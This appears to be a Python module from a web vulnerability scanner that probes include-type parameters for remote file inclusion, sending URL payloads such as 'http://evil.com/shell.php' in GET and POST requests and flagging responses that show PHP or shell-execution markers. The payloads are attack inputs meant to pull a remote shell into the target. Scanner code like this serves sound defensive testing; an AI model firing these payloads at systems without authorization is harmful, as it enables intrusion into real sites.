#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import json
import re
from RAGScripts.utils.logger import setup_scanner_logger

async def check_rfi_vulnerabilities(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for RFI
        test_cases = [
            {
                'name': 'Basic RFI',
                'payloads': [
                    'http://evil.com/shell.php',
                    'https://attacker.com/malicious.php',
                    'ftp://malicious.com/backdoor.php',
                    '//evil.com/shell.php'
                ]
            },
            {
                'name': 'Encoded RFI',
                'payloads': [
                    'http%3A%2F%2Fevil.com%2Fshell.php',
                    'https%3A%2F%2Fattacker.com%2Fmalicious.php',
                    '%2F%2Fevil.com%2Fshell.php',
                    'http://%65%76%69%6C.com/shell.php'
                ]
            },
            {
                'name': 'Protocol-relative RFI',
                'payloads': [
                    '\\\\evil.com\\share\\shell.php',
                    '//evil.com/shell.php?',
                    '\\\\attacker.com\\c$\\shell.php',
                    '//malicious.com/backdoor.php#'
                ]
            },
            {
                'name': 'Parameter pollution',
                'payloads': [
                    'http://evil.com/shell.php?param=1',
                    'http://evil.com/shell.php#fragment',
                    'http://evil.com/shell.php?time=1234',
                    'http://evil.com/shell.php;param=1'
                ]
            }
        ]
        
        # Parameters that might be vulnerable
        include_params = ['include', 'file', 'page', 'template', 'module', 'path', 'load', 'read']
        
        # Extract parameters from URL
        parsed_url = urlparse(test_url)
        query_params = parse_qs(parsed_url.query)
        
        for param_name, param_value in query_params.items():
            if any(ip in param_name.lower() for ip in include_params):
                for test in test_cases:
                    for payload in test['payloads']:
                        try:
                            modified_params = query_params.copy()
                            modified_params[param_name] = [payload]
                            
                            response = requests.request(
                                method,
                                test_url,
                                params=modified_params,
                                timeout=5,
                                allow_redirects=False
                            )
                            
                            if is_rfi_vulnerable(response, test):
                                findings.append({
                                    "type": "RFI",
                                    "detail": f"Potential {test['name']} vulnerability",
                                    "evidence": {
                                        "url": test_url,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "status_code": response.status_code,
                                        "response": response.text[:200]
                                    }
                                })
                                
                        except requests.exceptions.RequestException:
                            continue
        
        # Test POST parameters
        if method in ['POST', 'PUT']:
            for test in test_cases:
                for payload in test['payloads']:
                    try:
                        # Test form data
                        form_data = {param: payload for param in include_params}
                        response = requests.request(
                            method,
                            test_url,
                            data=form_data,
                            headers={'Content-Type': 'application/x-www-form-urlencoded'},
                            timeout=5,
                            allow_redirects=False
                        )
                        
                        if is_rfi_vulnerable(response, test):
                            findings.append({
                                "type": "RFI",
                                "detail": f"Potential {test['name']} vulnerability in POST data",
                                "evidence": {
                                    "url": test_url,
                                    "payload": payload,
                                    "status_code": response.status_code,
                                    "response": response.text[:200]
                                }
                            })
                            
                    except requests.exceptions.RequestException:
                        continue
                    
    except Exception as e:
        print(f"Error in RFI check: {str(e)}")
    
    return findings

def is_rfi_vulnerable(response: requests.Response, test: Dict) -> bool:
    try:
        response_text = response.text.lower()
        
        # Check for remote file inclusion indicators
        rfi_indicators = [
            '<?php',               # PHP code
            '<%',                  # ASP code
            '<jsp:',               # JSP code
            'eval(',               # JavaScript eval
            'system(',             # System command execution
            'shell_exec(',         # Shell command execution
            'base64_decode(',      # Base64 decode
            'allow_url_include',   # PHP configuration
            'allow_url_fopen'      # PHP configuration
        ]
        
        # Check for successful inclusion
        if any(indicator in response_text for indicator in rfi_indicators):
            return True
        
        # Check for redirects to malicious domains
        if response.status_code in [301, 302, 307, 308]:
            location = response.headers.get('Location', '').lower()
            if any(domain in location for domain in ['evil.com', 'attacker.com', 'malicious.com']):
                return True
        
        # Check for error messages that might indicate RFI
        error_patterns = [
            'failed to open stream',
            'failed to connect',
            'unable to connect',
            'connection refused',
            'network error',
            'curl error',
            'include_path'
        ]
        
        if any(pattern in response_text for pattern in error_patterns):
            if response.status_code != 404:  # Expect 404 for proper file not found handling
                return True
        
    except:
        pass
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_rfi_vulnerabilities(
            "http://localhost:5000",
            "/page.php?file=welcome.php",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())